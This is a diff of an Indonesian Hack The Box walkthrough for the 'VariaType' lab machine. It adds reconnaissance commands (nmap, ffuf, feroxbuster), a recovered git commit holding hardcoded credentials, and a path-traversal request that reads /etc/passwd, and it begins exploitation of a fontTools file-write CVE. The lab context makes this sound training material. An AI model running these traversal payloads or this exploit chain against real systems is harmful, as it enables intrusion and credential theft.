@@ -54,10 +54,11 @@ Secara keseluruhan, mesin ini menyoroti bahaya nyata dari repository yang terbuk
 Langkah pertama adalah menghubungkan terminal Kali Linux ke jaringan Hack The Box melalui VPN. Perintah yang dijalankan:
 
 ```bash
-sudo openvpn <nama-file>.ovpn
+sudo openvpn ~/Downloads/OpenVPN/variatype.ovpn
 ```
 
-![Koneksi VPN ke Hack The Box berhasil](02-vpn-connect.png)
+![Koneksi VPN ke Hack The Box berhasil](02-vpn-connect_01.png)
+![Koneksi VPN ke Hack The Box berhasil_02](02-vpn-connect_02.png)
 
 Setelah koneksi VPN aktif, mesin VariaType dinyalakan dan sistem mengalokasikan alamat IP target: **10.129.11.170**.
 
@@ -70,7 +71,7 @@ Setelah koneksi VPN aktif, mesin VariaType dinyalakan dan sistem mengalokasikan 
 Dengan IP target di tangan, pemindaian Nmap dijalankan untuk mengidentifikasi port yang terbuka beserta layanan yang berjalan di dalamnya:
 
 ```bash
-nmap -sC -sV -oN nmap-variatype.txt 10.129.11.170
+nmap -sC -sV -A -O -T4 -oN variaType_nmap.txt 10.129.42.177
 ```
 
 ![Hasil pemindaian Nmap pada mesin VariaType](04-nmap-scan.png)
@@ -89,12 +90,19 @@ Adanya redirect ke domain virtual host mengisyaratkan bahwa nama domain tersebut
 Karena layanan web melakukan redirect ke domain kustom, entri baru harus ditambahkan ke file resolusi host lokal agar permintaan bisa diarahkan dengan tepat:
 
 ```bash
-echo "10.129.11.170 variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
+echo "10.129.11.170 variatype.htb" | sudo tee -a /etc/hosts
 ```
 
-![Penambahan entri host untuk variatype.htb dan portal.variatype.htb](05-hosts-config.png)
+![Penambahan entri host untuk variatype.htb](05-hosts-config.png)
 
-Selain domain utama, subdomain `portal.variatype.htb` juga ditambahkan sejak awal untuk mengantisipasi kemungkinan adanya virtual host tambahan. Dengan konfigurasi ini, interaksi dengan aplikasi web dapat berjalan sebagaimana mestinya — bukan sekadar menggunakan alamat IP mentah.
+### Penemuan subdomain `portal` menggunakan ffuf
+```bash
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+    -H "Host: FUZZ.variatype.htb" -u http://variatype.htb -mc 200,302,401,403
+```
+![Penambahan entri host untuk portal.variatype.htb](05-hosts-config_ffuf.png)
+
+Selain domain utama, subdomain `portal.variatype.htb` juga ditambakan karena terdeteksi saat melakukan pemindaia subdomain menggunaka ffuf. Dengan konfigurasi ini, interaksi dengan aplikasi web dapat berjalan sebagaimana mestinya — bukan sekadar menggunakan alamat IP mentah.
 
 Setelah resolusi host siap, penelusuran terhadap kedua domain pun dimulai untuk memetakan fungsionalitas yang tersedia.
 
@@ -102,7 +110,13 @@ Setelah resolusi host siap, penelusuran terhadap kedua domain pun dimulai untuk 
 
 ## Penemuan Git Repository yang Terbuka
 
-Saat melakukan enumerasi pada subdomain `portal.variatype.htb`, ditemukan sebuah miskonfigurasi kritis: direktori `.git` dapat diakses secara publik melalui browser maupun permintaan HTTP biasa:
+Saat melakukan enumerasi pada subdomain `portal.variatype.htb` menggunakan feroxbuster, ditemukan sebuah miskonfigurasi kritis: 
+```bash
+feroxbuster -u http://portal.variatype.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --scan-dir-listings
+```
+![Direktori .git terbuka secara publik pada portal.variatype.htb_01](git_subdir_found.png)
+
+Direktori `.git` dapat diakses secara publik melalui browser maupun permintaan HTTP biasa:
 
 ```bash
 curl http://portal.variatype.htb/.git/HEAD
@@ -160,7 +174,7 @@ git log --oneline
 Salah satu commit menyebut nama pengguna **gitbot**, yang langsung menarik perhatian. Untuk menemukan commit yang mungkin sudah dihapus atau tidak lagi terhubung ke branch aktif, digunakan perintah berikut:
 
 ```bash
-git fsck --unreachable
+git fsck --no-reflog --full --unreachable | grep commit
 ```
 
 ![Penemuan unreachable commit melalui git fsck](10-git-fsck.png)
@@ -168,7 +182,7 @@ git fsck --unreachable
 Hasilnya mengungkap adanya **unreachable commit** — sebuah indikasi bahwa konten yang pernah dihapus masih tersimpan dalam objek Git. Commit tersebut kemudian diperiksa secara langsung:
 
 ```bash
-git show <commit-hash>
+git show 6f021da6be7086f2595befaa025a83d1de99478b
 ```
 
 ![Isi unreachable commit yang mengandung kredensial hardcoded](11-git-show.png)
@@ -181,18 +195,13 @@ Pesan commit bertuliskan *"remove hardcoded credentials"*, dan diff-nya memperli
 
 Memanfaatkan kredensial `gitbot` yang ditemukan dari riwayat Git, proses autentikasi ke portal dilakukan dan session cookie disimpan untuk digunakan pada permintaan selanjutnya:
 
-```bash
-curl -s -c cookies.txt -X POST http://portal.variatype.htb/login.php \
-  -d "username=gitbot&password=<PASSWORD>"
-```
-
 ![Autentikasi berhasil menggunakan kredensial gitbot dari histori Git](12-auth-login.png)
 
-Setelah mengekstrak `PHPSESSID` dari file cookie, dilakukan percobaan akses ke endpoint unduhan file dengan memanfaatkan parameter yang mencurigakan:
+Setelah mengekstrak `PHPSESSID` dari proses autentikasi sebelumnya, dilakukan percobaan akses ke endpoint unduhan file dengan memanfaatkan parameter yang mencurigakan:
 
 ```bash
-curl -s -b cookies.txt \
-  "http://portal.variatype.htb/download.php?file=../../../../etc/passwd"
+curl -s -i -b "PHPSESSID=q4da62f7c63pkeu0026dcrs8r4" \
+    "http://portal.variatype.htb/download.php?f=....//....//....//....//....//....//etc/passwd"
 ```
 
 ![Directory traversal berhasil membaca /etc/passwd dari server](13-file-disclosure.png)
@@ -208,28 +217,6 @@ Meski demikian, endpoint `download.php` ini hanya menawarkan akses baca file, se
 Setelah menyadari bahwa `download.php` bukan jalur yang optimal, fokus beralih ke celah yang lebih berbahaya: **CVE-2025-66034**, sebuah kerentanan Arbitrary File Write melalui XML Injection pada library `fontTools.varLib`.
 
 Langkah pertama adalah membuat dua file font minimal yang diperlukan sebagai referensi dalam designspace berbahaya:
-
-```python
-# generate_fonts.py
-from fontTools.ttLib import TTFont
-from fontTools.fontBuilder import FontBuilder
-
-def build_font(path, family):
-    fb = FontBuilder(1000, isTTF=True)
-    fb.setupGlyphOrder([".notdef"])
-    fb.setupCharacterMap({})
-    fb.setupGlyf({".notdef": fb.buildGlyph()})
-    fb.setupHorizontalMetrics({".notdef": (500, 0)})
-    fb.setupHorizontalHeader(ascent=800, descent=-200)
-    fb.setupNameTable({"familyName": family, "styleName": "Regular"})
-    fb.setupOs2()
-    fb.setupPost()
-    fb.setupHead(unitsPerEm=1000)
-    fb.font.save(path)
-
-build_font("source-light.ttf", "SourceTest")
-build_font("source-regular.ttf", "SourceTest")
-```
 
 ```bash
 python3 generate_fonts.py
